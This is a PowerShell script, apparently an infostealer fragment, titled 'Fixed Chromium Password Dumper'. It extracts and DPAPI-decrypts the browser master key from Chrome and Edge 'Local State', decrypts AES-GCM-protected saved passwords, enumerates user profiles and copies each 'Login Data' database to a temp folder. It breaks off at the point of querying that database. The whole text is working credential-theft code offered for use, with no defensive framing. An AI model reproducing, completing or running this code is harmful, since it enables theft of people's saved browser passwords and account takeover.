# Fixed Chromium Password Dumper - Chrome + Edge - multiple profiles - proper SQLite query via Add-Type hack or simple (needs browser closed!)
Add-Type -AssemblyName System.Security, System.Web

function Decrypt-Password {
    param($encryptedBlob, $masterKey)
    try {
        if ($encryptedBlob.Length -lt 3) { return "" }
        $version = [Text.Encoding]::ASCII.GetString($encryptedBlob[0..2])
        if ($version -eq "v10" -or $version -eq "v11") {
            $nonce = $encryptedBlob[3..14]
            $cipher = $encryptedBlob[15..($encryptedBlob.Length-17)]
            $tag = $encryptedBlob[($encryptedBlob.Length-16)..($encryptedBlob.Length-1)]
            $aes = New-Object Security.Cryptography.AesGcm $masterKey
            $plain = $aes.Decrypt($nonce, $cipher, $tag)
            return [Text.Encoding]::UTF8.GetString($plain)
        } else {
            # Fallback old DPAPI
            return [Security.Cryptography.ProtectedData]::Unprotect($encryptedBlob, $null, 'CurrentUser') | %{ [char]$_ } | Join-String
        }
    } catch { return "Decrypt failed: $_" }
}

function Get-MasterKey($basePath) {
    $localState = Join-Path $basePath "Local State"
    if (!(Test-Path $localState)) { return $null }
    $json = Get-Content $localState -Raw | ConvertFrom-Json
    $encKeyB64 = $json.os_crypt.encrypted_key
    if (!$encKeyB64) { return $null }
    $encKey = [Convert]::FromBase64String($encKeyB64)
    if ([Text.Encoding]::ASCII.GetString($encKey[0..4]) -ne "DPAPI") { return $null }
    return [Security.Cryptography.ProtectedData]::Unprotect($encKey[5..($encKey.Length-1)], $null, 'CurrentUser')
}

function Dump-Logins($basePath, $browserName) {
    $output = "$browserName`n"
    $masterKey = Get-MasterKey $basePath
    if (!$masterKey) { $output += "No master key`n"; return $output }

    $profiles = @("Default")
    Get-ChildItem (Join-Path $basePath "*") | ? { $_.PSIsContainer -and $_.Name -match "Profile \d" } | % { $profiles += $_.Name }

    foreach ($prof in $profiles) {
        $dbPath = Join-Path $basePath $prof "Login Data"
        if (!(Test-Path $dbPath)) { continue }
        $tmpDb = "$env:TEMP\$prof`_LoginData_$([guid]::NewGuid()).sqlite"
        Copy-Item $dbPath $tmpDb -Force
        # Minimal SQLite query - this needs System.Data.SQLite or hack
